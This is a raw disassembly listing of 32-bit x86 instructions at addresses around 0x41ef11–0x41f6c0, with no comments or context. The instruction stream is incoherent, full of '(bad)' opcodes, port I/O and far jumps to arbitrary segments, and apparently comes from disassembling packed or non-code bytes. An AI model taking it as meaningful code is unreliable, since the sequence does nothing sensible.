  41ef11:	mov    ds,WORD PTR [ebp+0x5]
  41ef14:	sub    eax,0x2248f3f8
  41ef19:	popf   
  41ef1a:	test   DWORD PTR [esi+ebp*8-0x59],esp
  41ef1e:	inc    eax
  41ef1f:	sahf   
  41ef20:	cmp    BYTE PTR [esi],bl
  41ef22:	loope  0x41efa3
  41ef24:	xor    edi,esi
  41ef26:	and    eax,0xddfe47da
  41ef2b:	adc    eax,0x748a43a
  41ef30:	xor    eax,DWORD PTR [esi-0x3e4b57d8]
  41ef36:	xchg   esp,eax
  41ef37:	clc    
  41ef38:	xchg   ebx,eax
  41ef39:	pop    ebp
  41ef3a:	add    esp,eax
  41ef3c:	test   eax,0xb474a83
  41ef41:	push   ebx
  41ef42:	daa    
  41ef43:	repnz and eax,0xcb4f50f8
  41ef49:	shr    DWORD PTR [esi+0x19cb84fb],1
  41ef4f:	pop    ds
  41ef50:	add    al,dh
  41ef52:	mov    al,ds:0x70f7abb0
  41ef57:	xor    eax,0xff4705f
  41ef5c:	or     edi,DWORD PTR [esi]
  41ef5e:	popf   
  41ef5f:	in     al,0x41
  41ef61:	mov    dl,0x1
  41ef63:	mov    ds:0x910ec214,eax
  41ef68:	popf   
  41ef69:	inc    esp
  41ef6a:	repnz aad 0x88
  41ef6d:	imul   edx,DWORD PTR [ebx-0x53],0x77
  41ef71:	push   ds
  41ef72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef73:	popa   
  41ef74:	loop   0x41ef35
  41ef76:	xchg   BYTE PTR [edx+edi*4-0x40],dh
  41ef7a:	repz mov ecx,0x17c453fc
  41ef80:	clc    
  41ef81:	(bad)  
  41ef82:	out    0xe0,eax
  41ef84:	rol    DWORD PTR [ebx-0x11],0x3a
  41ef88:	inc    cx
  41ef8a:	and    al,0xa0
  41ef8c:	addr16 jmp 0x7d53:0xe31404de
  41ef94:	xchg   esp,eax
  41ef95:	sbb    BYTE PTR [esi-0x5ec9a3b7],bl
  41ef9b:	xor    eax,0x4a3dfb29
  41efa0:	cld    
  41efa1:	scas   eax,DWORD PTR es:[edi]
  41efa2:	sahf   
  41efa3:	push   0xffffffb3
  41efa5:	mov    al,ds:0xb467dd0d
  41efaa:	sbb    BYTE PTR [ebx-0x17f485b4],bh
  41efb0:	xchg   ebp,eax
  41efb1:	or     al,ch
  41efb3:	pop    ebp
  41efb4:	dec    edi
  41efb5:	repz cmp eax,0xd99841ec
  41efbb:	sub    al,BYTE PTR [edx+0x17f8c7d2]
  41efc1:	push   edx
  41efc2:	adc    eax,0xd1d9731
  41efc7:	sahf   
  41efc8:	or     edx,DWORD PTR es:[esi]
  41efcb:	ret    0xb7de
  41efce:	stc    
  41efcf:	in     eax,0x9f
  41efd1:	sbb    esp,DWORD PTR [ecx]
  41efd3:	and    BYTE PTR [edx-0x1a732499],dl
  41efd9:	fimul  DWORD PTR [eax]
  41efdb:	xor    ch,BYTE PTR [esi+ecx*1-0x4ad0401d]
  41efe2:	ret    0x9ad0
  41efe5:	lea    edi,[eax-0x32cba7e0]
  41efeb:	stos   BYTE PTR es:[edi],al
  41efec:	shl    DWORD PTR [edi-0x32cf536e],0xc3
  41eff3:	clc    
  41eff4:	scas   al,BYTE PTR es:[edi]
  41eff5:	adc    bh,ah
  41eff7:	lahf   
  41eff8:	pop    ebx
  41eff9:	js     0x41eff0
  41effb:	lds    ecx,FWORD PTR [esi]
  41effd:	mov    ah,0x3f
  41efff:	pop    es
  41f000:	cdq    
  41f001:	push   0x99d0c51c
  41f006:	or     edx,esi
  41f008:	das    
  41f009:	sub    DWORD PTR [edi+0x471c8a7f],edi
  41f00f:	push   ebx
  41f010:	mov    edx,0x61bd34ef
  41f015:	mov    ds:0xf1681a4c,al
  41f01a:	push   eax
  41f01b:	or     ah,dh
  41f01d:	or     ch,BYTE PTR [ebp-0x49]
  41f020:	arpl   WORD PTR [edx+0x17],dx
  41f023:	mov    esp,0xe16c97c6
  41f028:	shl    BYTE PTR [ebp-0x626bef02],cl
  41f02e:	lock fnstsw WORD PTR [edi+ebp*1]
  41f032:	mov    ?,WORD PTR ds:0x192389a2
  41f038:	lds    ebp,FWORD PTR [eax-0x2a]
  41f03b:	xchg   esp,eax
  41f03c:	mov    dh,BYTE PTR [esi+0x42dd17f1]
  41f042:	in     eax,dx
  41f043:	leave  
  41f044:	inc    ecx
  41f045:	jns    0x41f033
  41f047:	dec    ebp
  41f048:	mov    ecx,0xb8b2f261
  41f04d:	out    0x26,al
  41f04f:	and    ebp,eax
  41f051:	sub    eax,0x90642017
  41f056:	sub    eax,DWORD PTR [ebx]
  41f058:	and    cl,cl
  41f05a:	ret    
  41f05b:	mov    al,dl
  41f05d:	mov    cl,BYTE PTR [ecx+ebx*8]
  41f060:	add    al,0x92
  41f062:	addr16 mov esp,0xc784777c
  41f068:	jnp    0x41f02d
  41f06a:	cdq    
  41f06b:	mov    ds:0x95f068e2,eax
  41f070:	rcl    BYTE PTR ds:0xb8f758b1,0x91
  41f077:	pop    ds
  41f078:	sahf   
  41f079:	adc    eax,DWORD PTR [esi+eax*4]
  41f07c:	repz int3 
  41f07e:	stos   DWORD PTR es:[edi],eax
  41f07f:	xor    BYTE PTR [edi-0x71],dl
  41f082:	shl    BYTE PTR [ebp+0x23],1
  41f085:	shl    DWORD PTR [esi],cl
  41f087:	sbb    esi,ebp
  41f089:	mov    ebx,fs
  41f08b:	cmp    eax,0x3c4c195c
  41f090:	add    BYTE PTR [edx+0x55],ah
  41f093:	repz adc ch,al
  41f096:	ins    DWORD PTR es:[edi],dx
  41f097:	pop    ecx
  41f098:	xor    DWORD PTR [eax],esp
  41f09a:	push   0x44d314c9
  41f09f:	or     BYTE PTR [eax+edi*4-0x45],dl
  41f0a3:	xchg   BYTE PTR [ebp-0x214c72fe],bl
  41f0a9:	into   
  41f0aa:	rcr    DWORD PTR [edi+0x53],0x9d
  41f0ae:	or     DWORD PTR [ebx+0x39a460ed],edi
  41f0b4:	sar    DWORD PTR [edx+0x1701ece1],cl
  41f0ba:	bound  edx,QWORD PTR [esi+0x36]
  41f0bd:	jle    0x41f0ac
  41f0bf:	adc    al,0x97
  41f0c1:	(bad)  
  41f0c2:	xchg   ebx,eax
  41f0c3:	es push ss
  41f0c5:	fisubr DWORD PTR [edi-0x2b689423]
  41f0cb:	aaa    
  41f0cc:	in     al,0xc9
  41f0ce:	bound  edi,QWORD PTR [edi-0x7f]
  41f0d1:	cmc    
  41f0d2:	add    BYTE PTR [ecx+0x65f07d8b],bh
  41f0d8:	jp     0x41f083
  41f0da:	jg     0x41f13e
  41f0dc:	jg     0x41f131
  41f0de:	mov    bl,0xb4
  41f0e0:	mov    ds:0x34b566a,eax
  41f0e5:	jmp    0xc90dbd37
  41f0ea:	xchg   DWORD PTR [ebx-0x4],ebx
  41f0ed:	push   eax
  41f0ee:	pusha  
  41f0ef:	mov    edi,0x76e74d3a
  41f0f4:	sbb    DWORD PTR [edi],esp
  41f0f6:	pop    ebp
  41f0f7:	xor    al,0x15
  41f0f9:	dec    ecx
  41f0fa:	sbb    ebx,edx
  41f0fc:	and    BYTE PTR [eax],ch
  41f0fe:	push   edi
  41f0ff:	and    eax,0x7977ae93
  41f104:	mov    dl,0x26
  41f106:	jno    0x41f106
  41f108:	push   ss
  41f109:	out    0xbb,eax
  41f10b:	inc    ebp
  41f10c:	inc    ebx
  41f10d:	sub    dh,al
  41f10f:	int    0x45
  41f111:	jo     0x41f0e4
  41f113:	mov    al,ds:0x78dfb9a5
  41f118:	mov    dh,0xa4
  41f11a:	pop    edi
  41f11b:	jle    0x41f175
  41f11d:	mov    bh,0xdc
  41f11f:	(bad)  [esi+eiz*8-0xd97d3d6]
  41f126:	push   edx
  41f127:	or     esi,DWORD PTR [ebp-0x789bccec]
  41f12d:	in     eax,dx
  41f12e:	mov    dh,0xb1
  41f130:	mov    ch,0x3
  41f132:	dec    ecx
  41f133:	cdq    
  41f134:	xchg   esp,eax
  41f135:	mov    ebx,DWORD PTR [ebx]
  41f137:	test   eax,0x916f03cf
  41f13c:	adc    eax,0x2ae7fca1
  41f141:	shl    DWORD PTR [ecx+0x4c],1
  41f144:	in     eax,0x5e
  41f146:	mov    ebx,0xcfdf8371
  41f14b:	push   cs
  41f14c:	cmp    eax,DWORD PTR [ebp+0x6]
  41f14f:	lds    esi,FWORD PTR [eax+0x1a]
  41f152:	pop    ds
  41f153:	cmc    
  41f154:	ss sahf 
  41f156:	xor    al,0x1d
  41f158:	retf   
  41f159:	repnz sbb eax,0x878f43af
  41f15f:	xor    BYTE PTR [edi],dh
  41f161:	mov    ds,WORD PTR [esi-0x702ff63e]
  41f167:	sbb    DWORD PTR [edx+ebx*1],ecx
  41f16a:	(bad)  
  41f16b:	(bad)  
  41f16c:	js     0x41f1b1
  41f16e:	push   edx
  41f16f:	xor    bl,bl
  41f171:	jae    0x41f1ec
  41f173:	inc    edi
  41f174:	dec    ebp
  41f175:	dec    esi
  41f176:	jae    0x41f144
  41f178:	fistp  WORD PTR [ecx]
  41f17a:	lods   eax,DWORD PTR ds:[esi]
  41f17b:	popa   
  41f17c:	add    al,0xd6
  41f17e:	fist   DWORD PTR [edx+edi*2+0x2fdacd9b]
  41f185:	mov    ecx,esi
  41f187:	jmp    0x161e:0xa07df8a4
  41f18e:	lds    ebp,FWORD PTR [eax+0x2b6dce91]
  41f194:	mov    ecx,0x6d0c6918
  41f199:	call   0x74de95eb
  41f19e:	and    BYTE PTR [edx-0x1a],cl
  41f1a1:	leave  
  41f1a2:	push   edx
  41f1a3:	dec    edi
  41f1a4:	xchg   ebp,eax
  41f1a5:	adc    eax,0x25be152b
  41f1aa:	sub    DWORD PTR [ebx-0x30ad6641],eax
  41f1b0:	lahf   
  41f1b1:	std    
  41f1b2:	imul   eax,eax,0x1e35c270
  41f1b8:	and    BYTE PTR [ebx+eax*4+0x72],bl
  41f1bc:	repnz inc edx
  41f1be:	cmp    DWORD PTR [ecx+ecx*1+0x4ca41b20],esi
  41f1c5:	in     al,dx
  41f1c6:	xchg   DWORD PTR [esi+0x332bd9c7],edx
  41f1cc:	jns    0x41f169
  41f1ce:	fdivr  DWORD PTR [ebx]
  41f1d0:	sub    ch,BYTE PTR [ebp+0x50]
  41f1d3:	jbe    0x41f1ec
  41f1d5:	lock sbb edi,DWORD PTR [edx-0x22a4eae7]
  41f1dc:	jg     0x41f197
  41f1de:	cdq    
  41f1df:	bound  eax,QWORD PTR [eax]
  41f1e1:	dec    edx
  41f1e2:	jae    0x41f257
  41f1e4:	int    0x35
  41f1e6:	test   al,0x7a
  41f1e8:	add    DWORD PTR [edx],ebx
  41f1ea:	shl    BYTE PTR [edx-0x64320d24],0xfc
  41f1f1:	pusha  
  41f1f2:	mov    esi,0x606edc9b
  41f1f7:	inc    ecx
  41f1f8:	loope  0x41f244
  41f1fa:	repnz sbb eax,0x9f6c3bc8
  41f200:	(bad)  
  41f201:	in     al,dx
  41f202:	adc    al,0x21
  41f204:	mov    dh,0xe2
  41f206:	ss ds loop 0x41f26f
  41f20a:	jg     0x41f286
  41f20c:	push   ebx
  41f20d:	(bad)  
  41f20f:	xchg   esp,eax
  41f210:	xchg   esi,eax
  41f211:	cs push edi
  41f213:	jl     0x41f22d
  41f215:	ss xchg edi,eax
  41f217:	data16 mov bl,0xbf
  41f21a:	dec    ah
  41f21c:	ins    DWORD PTR es:[edi],dx
  41f21d:	pop    es
  41f21e:	xor    esp,DWORD PTR [eax+0x23]
  41f221:	mov    ebx,0x5bef41e0
  41f226:	test   al,0x6f
  41f228:	cmc    
  41f229:	pop    ecx
  41f22a:	les    esi,FWORD PTR [eax]
  41f22c:	jns    0x41f239
  41f22e:	dec    esi
  41f22f:	dec    eax
  41f230:	fnstcw WORD PTR ds:0xb3df5ae1
  41f236:	push   edx
  41f237:	inc    DWORD PTR [ebx]
  41f239:	add    DWORD PTR [edi-0x942598f],edx
  41f23f:	shr    DWORD PTR [ecx+edi*1],cl
  41f242:	jge    0x41f1c5
  41f244:	inc    esi
  41f245:	jb     0x41f1d3
  41f247:	pop    eax
  41f248:	aas    
  41f249:	jns    0x41f22b
  41f24b:	xchg   DWORD PTR [ecx-0x721b980f],edi
  41f251:	push   0x4c
  41f253:	mov    bl,0x54
  41f255:	pop    esp
  41f256:	pop    es
  41f257:	pop    eax
  41f258:	fst    DWORD PTR [edi-0x2c1e6682]
  41f25e:	icebp  
  41f25f:	xlat   BYTE PTR ds:[ebx]
  41f260:	ror    BYTE PTR [edi+0x394e9614],1
  41f266:	pushf  
  41f267:	or     BYTE PTR [ebp+0xe],bl
  41f26a:	push   edx
  41f26b:	dec    esp
  41f26c:	hlt    
  41f26d:	sbb    DWORD PTR [edi+0x1b],eax
  41f270:	pop    esp
  41f271:	lahf   
  41f272:	add    esp,edi
  41f274:	mov    WORD PTR [esi-0x65],?
  41f277:	dec    BYTE PTR [esi-0x66]
  41f27a:	stos   DWORD PTR es:[edi],eax
  41f27b:	jle    0x41f21b
  41f27d:	jecxz  0x41f221
  41f27f:	mov    esp,0x9d084565
  41f285:	push   DWORD PTR [edi]
  41f287:	sub    esp,eax
  41f289:	push   ebp
  41f28a:	dec    ebx
  41f28b:	mov    esi,0xb55cc146
  41f290:	xrelease mov DWORD PTR ds:0xca933d2e,edx
  41f297:	test   ah,ah
  41f299:	enter  0x6888,0x81
  41f29d:	aad    0x9a
  41f29f:	cdq    
  41f2a0:	fstp   QWORD PTR [ebx-0x2dd0b35d]
  41f2a6:	mov    dh,0x6a
  41f2a8:	push   ds
  41f2a9:	js     0x41f28d
  41f2ab:	and    eax,0x4b48848b
  41f2b0:	jno    0x41f26a
  41f2b2:	xor    esi,DWORD PTR [ebx+0x5ca09461]
  41f2b8:	test   BYTE PTR [esi-0x4f],ch
  41f2bb:	and    cl,BYTE PTR ds:0x8748f31e
  41f2c1:	popa   
  41f2c2:	sbb    ch,BYTE PTR [edi+0x19]
  41f2c5:	imul   BYTE PTR [eax+0x1ef0dbd5]
  41f2cb:	call   0x3b23:0x88998f93
  41f2d2:	sbb    dl,BYTE PTR [edi]
  41f2d4:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2d6:	(bad)  
  41f2d7:	lock in eax,dx
  41f2d9:	retf   
  41f2da:	push   esi
  41f2db:	inc    edi
  41f2dc:	xchg   esp,eax
  41f2dd:	cli    
  41f2de:	fadd   QWORD PTR [ebx]
  41f2e0:	xor    esp,DWORD PTR ds:0x529b2a0e
  41f2e6:	add    BYTE PTR [ebx],ch
  41f2e8:	jmp    ebp
  41f2ea:	dec    edi
  41f2eb:	test   BYTE PTR [ecx-0x74],0xe9
  41f2ef:	cmc    
  41f2f0:	or     eax,0x448471cd
  41f2f5:	lahf   
  41f2f6:	jnp    0x41f365
  41f2f8:	jl     0x41f34c
  41f2fa:	shl    BYTE PTR [ebx-0x3e],cl
  41f2fd:	mov    DWORD PTR [ebx],edi
  41f2ff:	push   0xffffff98
  41f301:	and    al,0xe1
  41f303:	inc    edx
  41f304:	or     eax,0xc9beb0b3
  41f309:	and    DWORD PTR [eax],0x6ed32a8d
  41f30f:	xor    al,0x59
  41f311:	jg     0x41f313
  41f313:	test   eax,edi
  41f315:	add    BYTE PTR [edx-0x4a],ch
  41f318:	sub    DWORD PTR [edx+eax*4],ecx
  41f31b:	dec    edx
  41f31c:	mov    esp,fs
  41f31e:	push   ebx
  41f31f:	imul   esi,DWORD PTR [ebx-0x4f05114b],0x5479f3bd
  41f329:	pop    edi
  41f32a:	inc    edx
  41f32b:	inc    edi
  41f32c:	cmp    cl,dl
  41f32e:	(bad)  
  41f32f:	mov    cl,0xcb
  41f331:	jbe    0x41f2cb
  41f333:	push   ss
  41f334:	mov    bl,0xbf
  41f336:	repnz bound edi,QWORD PTR [ecx-0xb]
  41f33a:	xchg   BYTE PTR [edx],ah
  41f33c:	dec    esi
  41f33d:	out    0x2,al
  41f33f:	xor    eax,DWORD PTR [eax]
  41f341:	shl    BYTE PTR [ecx+edi*1+0x71c8de24],0x32
  41f349:	je     0x41f2df
  41f34b:	loopne 0x41f38a
  41f34d:	retfw  
  41f34f:	icebp  
  41f350:	setns  BYTE PTR [ecx+0xa]
  41f354:	loopne 0x41f3ac
  41f356:	std    
  41f357:	loop   0x41f2e0
  41f359:	adc    bh,dh
  41f35b:	jnp    0x41f327
  41f35d:	xchg   ebx,eax
  41f35e:	mov    ebp,es
  41f360:	out    dx,eax
  41f361:	xor    DWORD PTR [ebx],ebx
  41f363:	jnp    0x41f2fc
  41f365:	push   ebp
  41f366:	fisttp DWORD PTR [esi+0x39]
  41f369:	pop    eax
  41f36a:	into   
  41f36b:	test   BYTE PTR [ecx-0x14f08291],bl
  41f371:	xchg   edi,eax
  41f372:	dec    ebp
  41f373:	mov    esp,0xee6a20dc
  41f378:	push   ebp
  41f379:	shrd   DWORD PTR [ebx-0x397a4022],esi,cl
  41f380:	mov    ch,0xdd
  41f382:	jnp    0x41f3ba
  41f384:	out    dx,eax
  41f385:	pop    ss
  41f386:	add    DWORD PTR [ecx-0x1fd3d56a],esp
  41f38c:	jo     0x41f3cc
  41f38e:	out    0x10,al
  41f390:	(bad)  
  41f391:	shl    bl,1
  41f393:	into   
  41f394:	jno    0x41f3cb
  41f396:	pop    ecx
  41f397:	mov    bl,0xca
  41f399:	sub    BYTE PTR [ebx-0x3c],dl
  41f39c:	stos   BYTE PTR es:[edi],al
  41f39d:	std    
  41f39e:	adc    DWORD PTR [ecx],eax
  41f3a0:	mov    eax,eax
  41f3a2:	xchg   DWORD PTR [ecx-0x687e240b],esi
  41f3a8:	rcr    cl,0x54
  41f3ab:	arpl   dx,bp
  41f3ad:	sub    al,0x7d
  41f3af:	jno    0x41f339
  41f3b1:	mov    dh,0x32
  41f3b3:	mov    edx,0xaa464582
  41f3b8:	push   0x13
  41f3ba:	sti    
  41f3bb:	mov    al,ds:0x6e372a66
  41f3c0:	js     0x41f3bc
  41f3c2:	mov    dl,BYTE PTR [ebx+0x2f]
  41f3c5:	or     edx,eax
  41f3c7:	arpl   WORD PTR [esi-0x2844e69a],bx
  41f3cd:	mov    dl,0xd3
  41f3cf:	and    ch,BYTE PTR [edx+0x47]
  41f3d2:	add    DWORD PTR [ebx+ebp*2-0x2e86e7dd],edi
  41f3d9:	(bad)  
  41f3da:	mov    ecx,0x37b79eb7
  41f3df:	push   ebx
  41f3e0:	ja     0x41f3fc
  41f3e2:	push   0x79
  41f3e4:	mov    eax,ds:0x3ef14db8
  41f3e9:	xor    al,0xf0
  41f3eb:	hlt    
  41f3ec:	das    
  41f3ed:	mov    al,0xaa
  41f3ef:	adc    eax,0xe9ec7dd2
  41f3f4:	in     eax,dx
  41f3f5:	aad    0xa8
  41f3f7:	lods   al,BYTE PTR ds:[esi]
  41f3f8:	inc    al
  41f3fa:	inc    eax
  41f3fb:	imul   ebp,DWORD PTR [edi-0x52],0xffffff90
  41f3ff:	fwait
  41f400:	in     al,dx
  41f401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f402:	inc    esp
  41f403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f404:	test   BYTE PTR [ebx],bh
  41f406:	jg     0x41f388
  41f408:	ins    BYTE PTR es:[edi],dx
  41f409:	pop    ds
  41f40a:	push   ecx
  41f40b:	sub    BYTE PTR [ebx],al
  41f40d:	adc    BYTE PTR [ebx],cl
  41f40f:	xchg   ecx,eax
  41f410:	xor    eax,0xee1f3cbc
  41f415:	xor    dl,BYTE PTR [esi+0x7f]
  41f418:	dec    esi
  41f419:	inc    ebx
  41f41a:	loope  0x41f41b
  41f41c:	sub    al,0x63
  41f41e:	xchg   esi,eax
  41f41f:	cmp    eax,0x300e0369
  41f424:	push   edi
  41f425:	pop    edx
  41f426:	xchg   BYTE PTR [edx+esi*2-0x27],ch
  41f42a:	and    al,0x57
  41f42c:	mov    esi,0x4152439f
  41f431:	inc    ecx
  41f432:	fs push esp
  41f434:	jo     0x41f469
  41f436:	mov    ah,0xb5
  41f438:	jmp    0x41f49a
  41f43a:	sub    al,0x18
  41f43c:	jnp    0x41f4ad
  41f43e:	call   0x4c4c30b5
  41f443:	lds    esi,FWORD PTR [ecx-0x302d3ce5]
  41f449:	shl    esi,0xea
  41f44c:	inc    edx
  41f44d:	lds    ebx,FWORD PTR [ebx]
  41f44f:	add    ebx,0x5aca0baf
  41f455:	pop    ds
  41f456:	dec    edi
  41f457:	test   al,0xf1
  41f459:	mov    ebx,0xf89ec823
  41f45e:	inc    eax
  41f45f:	xor    DWORD PTR [ecx+0x4cf0e50],0xd55b813f
  41f469:	sbb    esp,DWORD PTR [edx]
  41f46b:	mov    edx,0x6474ed5
  41f470:	dec    esp
  41f471:	xor    edx,DWORD PTR [eax]
  41f473:	loop   0x41f4a1
  41f475:	jbe    0x41f433
  41f477:	mov    ah,0xdb
  41f479:	pop    esp
  41f47a:	rcl    cl,1
  41f47c:	xchg   ecx,eax
  41f47d:	test   BYTE PTR [eax],dh
  41f47f:	std    
  41f480:	adc    eax,DWORD PTR [edi+0x57]
  41f483:	sub    bl,BYTE PTR [eax+0x478ffa32]
  41f489:	pop    esp
  41f48a:	lock int 0x34
  41f48d:	jbe    0x41f43e
  41f48f:	imul   ebx,DWORD PTR [ecx],0x64
  41f492:	pop    ebx
  41f493:	(bad)  
  41f494:	push   esp
  41f495:	pop    esp
  41f496:	aad    0x94
  41f498:	pusha  
  41f499:	jmp    0x2fc0f5b4
  41f49e:	sar    BYTE PTR [edi-0x798a7ee],0xbd
  41f4a5:	xor    BYTE PTR [esi+0x79],al
  41f4a8:	cmp    al,0x3e
  41f4aa:	ins    DWORD PTR es:[edi],dx
  41f4ab:	sar    DWORD PTR [ebx],1
  41f4ad:	shl    BYTE PTR [esi],0x88
  41f4b0:	xor    DWORD PTR ds:0xd64d2d9e,esi
  41f4b6:	fwait
  41f4b7:	ins    DWORD PTR es:[edi],dx
  41f4b8:	sub    eax,0x737cbf16
  41f4bd:	dec    edx
  41f4be:	stc    
  41f4bf:	mov    dl,0x35
  41f4c1:	mov    esi,0x21c131f9
  41f4c6:	sbb    ebp,0xffed4a24
  41f4cc:	xor    bh,BYTE PTR [edx+0x66ce875]
  41f4d2:	jle    0x41f4a2
  41f4d4:	cmp    ah,dl
  41f4d6:	test   edx,ebp
  41f4d8:	jl     0x41f53c
  41f4da:	and    al,0xa9
  41f4dc:	imul   esp,DWORD PTR gs:[eax],0xc067b853
  41f4e3:	stos   BYTE PTR es:[edi],al
  41f4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4e5:	xchg   edx,eax
  41f4e6:	push   edx
  41f4e7:	pusha  
  41f4e8:	push   0xffffff92
  41f4ea:	xor    al,0xaf
  41f4ec:	repnz imul edi,ecx,0xffffffb0
  41f4f0:	inc    edi
  41f4f1:	jmp    0xe397:0x630ad8d7
  41f4f8:	call   0xbaff5ea6
  41f4fd:	sbb    bl,BYTE PTR [esi+0x14]
  41f500:	cli    
  41f501:	sbb    DWORD PTR [edi+0x74],eax
  41f504:	sbb    dh,bh
  41f506:	into   
  41f507:	test   eax,0x9deb09f3
  41f50c:	jb     0x41f564
  41f50e:	aas    
  41f50f:	into   
  41f510:	sub    dl,BYTE PTR [eax]
  41f512:	pop    ebx
  41f513:	repz dec edi
  41f515:	and    ebp,DWORD PTR [ecx+0x7e]
  41f518:	mov    esp,0x8bc48fb
  41f51d:	adc    cl,BYTE PTR [esi]
  41f51f:	jle    0x41f59e
  41f521:	imul   ecx,eax,0x61ba1aa0
  41f527:	imul   eax,DWORD PTR [eax-0x21edb316],0xe9d6ef25
  41f531:	mov    esi,0xc50dcb63
  41f536:	loope  0x41f514
  41f538:	xor    di,WORD PTR [ecx-0xe]
  41f53c:	int3   
  41f53d:	xchg   ecx,eax
  41f53e:	repz dec ebx
  41f540:	or     eax,0xf8659a56
  41f545:	and    ecx,DWORD PTR [eax-0x10b06ac1]
  41f54b:	add    al,0xca
  41f54d:	mov    ah,0xc2
  41f54f:	cmc    
  41f550:	mov    ebp,0x42bef0f5
  41f555:	jmp    0xe61e:0x5b20cf40
  41f55c:	pop    edi
  41f55d:	jo     0x41f594
  41f55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f560:	fcomp  DWORD PTR [esi-0x3f428d1e]
  41f566:	shl    DWORD PTR [esi+0x7d],cl
  41f569:	sub    ah,BYTE PTR [esi+eax*4+0x6dc2ca92]
  41f570:	jns    0x41f55f
  41f572:	ss xchg ebp,eax
  41f574:	mov    ch,0x94
  41f576:	retf   
  41f577:	cmc    
  41f578:	jmp    0xbba57ae9
  41f57d:	outs   dx,DWORD PTR ds:[esi]
  41f57e:	int    0x44
  41f580:	not    BYTE PTR [ebp+0x33c4646c]
  41f586:	xchg   ecx,eax
  41f587:	push   ebp
  41f588:	inc    ebp
  41f589:	popa   
  41f58a:	pop    DWORD PTR [edi]
  41f58c:	dec    ecx
  41f58d:	shl    dl,1
  41f58f:	and    dl,BYTE PTR [ecx]
  41f591:	std    
  41f592:	push   0x23
  41f594:	mov    ebp,edi
  41f596:	xor    dh,ah
  41f598:	(bad)  
  41f599:	repnz clc 
  41f59b:	add    BYTE PTR [ebx-0x2b],0x6e
  41f59f:	dec    ebx
  41f5a0:	push   ebp
  41f5a1:	add    al,0xd0
  41f5a3:	shr    DWORD PTR [ebx-0x33c5ce3],0x6b
  41f5aa:	mov    edx,0x576230b3
  41f5af:	retf   
  41f5b0:	fist   WORD PTR [esi+0x345ca1a7]
  41f5b6:	test   al,0x4
  41f5b8:	ins    DWORD PTR es:[edi],dx
  41f5b9:	cmp    eax,0x55
  41f5bc:	xchg   esp,eax
  41f5bd:	je     0x41f57a
  41f5bf:	push   ecx
  41f5c0:	sub    ebx,DWORD PTR [edx+0x637c38d7]
  41f5c6:	adc    DWORD PTR [edi+0x5a74f40b],esp
  41f5cc:	pusha  
  41f5cd:	ss mov cl,0x48
  41f5d0:	icebp  
  41f5d1:	jge    0x41f589
  41f5d3:	shl    BYTE PTR [edx+0x5f932a57],1
  41f5d9:	pop    esi
  41f5da:	mov    bh,0xd5
  41f5dc:	rcl    BYTE PTR [esi+edx*8+0x3],0x7a
  41f5e1:	arpl   WORD PTR ds:[esi+0x4a9b0332],cx
  41f5e8:	jp     0x41f64c
  41f5ea:	fistp  WORD PTR [edi-0x7f12e1d1]
  41f5f0:	in     eax,dx
  41f5f1:	jle    0x41f57b
  41f5f3:	mov    eax,ds:0xe5fcfa45
  41f5f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5f9:	mov    edi,0x3fc6320f
  41f5fe:	pushf  
  41f5ff:	mov    ecx,0xee08d966
  41f604:	in     al,dx
  41f605:	dec    edx
  41f606:	imul   esi,DWORD PTR [edi+0xd],0xd168957a
  41f60d:	adc    eax,0x2b96749d
  41f612:	sbb    BYTE PTR [esi+0x650ee290],cl
  41f618:	push   edi
  41f619:	pop    ds
  41f61a:	push   eax
  41f61b:	iret   
  41f61c:	push   esi
  41f61d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f61e:	dec    edi
  41f61f:	sahf   
  41f620:	jecxz  0x41f5df
  41f622:	stos   BYTE PTR es:[edi],al
  41f623:	jae    0x41f69b
  41f625:	mov    DWORD PTR [ecx],ecx
  41f627:	mov    cl,0x8c
  41f629:	mov    ds:0xe45d021d,al
  41f62e:	pop    eax
  41f62f:	xchg   ebp,eax
  41f630:	jno    0x41f5dc
  41f632:	shl    BYTE PTR [ecx-0x49],cl
  41f635:	jecxz  0x41f61a
  41f637:	int    0x3a
  41f639:	mov    bl,0x47
  41f63b:	es mov bl,0xa2
  41f63e:	enter  0x30f4,0x7b
  41f642:	mov    cl,BYTE PTR [edx+0xe]
  41f645:	push   DWORD PTR [ebx-0x28]
  41f648:	stos   BYTE PTR es:[edi],al
  41f649:	stc    
  41f64a:	mov    cs,WORD PTR [eax-0x284ab0d8]
  41f650:	dec    eax
  41f651:	cs (bad) 
  41f653:	push   ss
  41f654:	daa    
  41f655:	cmp    DWORD PTR [ebp-0x1f617bd6],ecx
  41f65b:	lea    ebp,[ebp-0x6c0a3e07]
  41f661:	and    eax,0xd89d67b6
  41f666:	sbb    eax,0x138ddc37
  41f66b:	sbb    eax,0x9fdfc445
  41f670:	ins    BYTE PTR es:[edi],dx
  41f671:	jns    0x41f637
  41f673:	les    esp,FWORD PTR [ebx]
  41f675:	ror    BYTE PTR [ebx],cl
  41f677:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41f679:	cmp    ecx,DWORD PTR [ebp+0x53f5a9b]
  41f67f:	inc    ecx
  41f680:	sahf   
  41f681:	rcr    BYTE PTR [ebx+0x40ec36dd],0x69
  41f688:	ins    DWORD PTR es:[edi],dx
  41f689:	scas   al,BYTE PTR es:[edi]
  41f68a:	adc    al,0xfe
  41f68c:	xor    al,0x1c
  41f68e:	test   al,0xcf
  41f690:	adc    DWORD PTR [esi+edi*8+0x5800c87d],edi
  41f697:	cwde   
  41f698:	jmp    0x41f6fe
  41f69a:	(bad)  [edx-0x1b]
  41f69d:	data16 fld DWORD PTR [edi]
  41f6a0:	ins    DWORD PTR es:[edi],dx
  41f6a1:	sub    eax,0x7f21ac21
  41f6a6:	ror    DWORD PTR [ebx],0xe4
  41f6a9:	jb     0x41f6d3
  41f6ab:	mov    DWORD PTR [edi],esp
  41f6ad:	retf   0x5c21
  41f6b0:	cmp    DWORD PTR ds:0x6f32bf37,edi
  41f6b6:	(bad)  
  41f6b7:	fsubr  QWORD PTR ds:0x47cb1942
  41f6bd:	add    DWORD PTR [ebx+0x4e],ebp
  41f6c0:	call   0x9218:0x693c1bd8
